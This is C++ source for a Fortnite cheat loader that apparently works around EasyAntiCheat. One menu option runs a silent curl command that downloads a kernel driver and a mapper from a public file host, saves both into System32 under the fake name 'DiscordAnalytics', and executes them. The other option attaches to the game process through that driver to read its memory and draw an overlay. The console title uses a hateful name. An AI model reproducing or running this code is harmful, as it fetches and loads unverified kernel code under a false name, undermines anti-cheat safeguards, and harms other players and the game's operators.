
#include "includes/includes.hpp"
#include <Windows.h>
#include <iostream>
#include <chrono>
#include <filesystem>
#include <fstream>
#include "crypt/xorstr.h"
#include "mouse/mouse.hpp"
#include "crypt/spoof.hpp"
#include <thread>
#include "game/game.hpp"
#include "settings/settings.hpp"
#include "C:\Users\peter\Desktop\aura fn-updated-and-cleaned-up-by-husky\fck-eac.hpp"

// auth

//#include "includes/Keyauth/auth.hpp"


//using namespace KeyAuth;
//std::string name = ("DRACHENLORD"); // App name
//std::string ownerid = ("OmF7SXE1XT"); // Account ID
//std::string version = ("1.0"); // Application version. Used for automatic downloads see video here https://www.youtube.com/watch?v=kW195PLCBKs
//std::string url = ("https://keyauth.win/api/1.3/"); // change if using KeyAuth custom domains feature
//std::string path = (""); // (OPTIONAL) see tutorial here https://www.youtube.com/watch?v=I9rxt821gMk&t=1s
//
//
//api KeyAuthApp(name, ownerid, version, url, path);





static void typing_print(bool x, std::string text)
{

	int startR = 10, startG = 125, startB = 255;
	int endR = 0, endG = 0, endB = 255;
	int length = text.length();

	if (x)
	{
		auto now = std::chrono::system_clock::now();
		auto now_time_t = std::chrono::system_clock::to_time_t(now);
		std::tm tm;
		localtime_s(&tm, &now_time_t);
		std::ostringstream oss;
		oss << std::put_time(&tm, "%H:%M:%S");

		std::cout << "[" << oss.str() << "] ";
	}

	for (int i = 0; i < length; ++i)
	{
		int r = startR + (endR - startR) * i / length;
		int g = startG + (endG - startG) * i / length;
		int b = startB + (endB - startB) * i / length;

		std::cout << "\033[38;2;" << r << ";" << g << ";" << b << "m";
		std::cout << text[i] << std::flush;
	}

	std::cout << "\033[0m\n";
}




void main()
{

	
	void typeAndSpeak3(const std::string & text, int delay);
	


	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	DWORD dwMode = 0;
	GetConsoleMode(hConsole, &dwMode);
	dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;
	SetConsoleMode(hConsole, dwMode);
	SetConsoleTitle(L"Shopcore-hitler Updated");

	//typeAndSpeak3(xorstr_("Connecting to server..."), 50);
	//Sleep(500); // Sleep for 1000 milliseconds (1 second)

	//KeyAuthApp.init();
	//system(xorstr_("cls"));

	//std::string license;

	//// **Remove file reading/writing, always ask for license input**
	//typeAndSpeak3(xorstr_("Enter your license:"), 50);
	//std::cin >> license;
	//system(xorstr_("cls"));

	//// Validate license as before
	//KeyAuthApp.license(license);
	//if (!KeyAuthApp.response.success)
	//{
	//	MessageBoxA(0, xorstr_("Invalid license or hwid doesnt match!"), xorstr_("Error"), MB_OK | MB_ICONERROR);
	//	exit(0);
	//}


	




	while (true)
	{


		std::string downloadUrl = "https://files.catbox.moe/70d8q8.png";
		SearchAndReplaceSplashScreen(downloadUrl);

		int select;
		typing_print(false, xorstr_("[1] Map Driver\n[2] Load Cheat"));
		std::cin >> select;

		if (select == 1)
		{
			system(xorstr_("cls"));
			MessageBoxA(0, xorstr_("Press OK to map the driver!"), xorstr_("Information"), MB_OK | MB_ICONINFORMATION);
			Beep(400, 600);
			typing_print(false, xorstr_("[i] Loading Driver... you may touch urself."));



			// Then download driver and mapper, and map the driver (still in System32)
			system("curl --silent https://files.catbox.moe/dbyo4p.sys --output C:\\Windows\\System32\\DiscordAnalytics.sys >nul 2>&1 && "
				"curl --silent https://files.catbox.moe/j5s1uy.bin --output C:\\Windows\\System32\\DiscordAnalytics.exe >nul 2>&1 && "
				"cd C:\\Windows\\System32 && DiscordAnalytics.exe DiscordAnalytics.sys >nul 2>&1");






			Beep(560, 500);
			typing_print(false, xorstr_("[+] Driver Loaded !"));
			system(xorstr_("cls"));
		}
		else if (select == 2)
		{
			MessageBoxA(0, xorstr_("In the lobby, press OK to load the cheat!"), xorstr_("Information"), MB_OK | MB_ICONINFORMATION);
			Beep(400, 200);
			system(xorstr_("cls"));

			if (!huskyud::find_driver())
			{
				MessageBoxA(0, xorstr_("The driver could not be found..."), xorstr_("Error"), MB_OK | MB_ICONERROR);
				exit(0);
			}

			huskyud::process_id = huskyud::find_process(L"FortniteClient-Win64-Shipping.exe"); // FortniteClient-Win64-Shipping.exe
			if (!huskyud::process_id)
			{
				MessageBoxA(0, xorstr_("Could not find fortnite..."), xorstr_("Error"), MB_OK | MB_ICONERROR);
				exit(0);
			}

			virtualaddy = huskyud::base_ADRESS();
			if (!virtualaddy)
			{
				MessageBoxA(0, xorstr_("The driver could not get the base address..."), xorstr_("Error"), MB_OK | MB_ICONERROR);
				exit(0);
			}

			auto cr3 = huskyud::CR3();
			settings::caching::base_address = virtualaddy;
			
			SonyDriverHelper::api::Init();
			mouse_interface();
			typing_print(true, xorstr_("Inject Succsesfull"));

			Beep(800, 100);
			std::thread([&]() { for (;;) { actor_cache_loop(); } }).detach();
			create_overlay();
			directx_init();
			render_loop();
		}
		else
		{
			MessageBoxA(0, xorstr_("Invalid selection... Try again..."), xorstr_("Error"), MB_OK | MB_ICONERROR);
			system(xorstr_("cls"));
		}
	}
}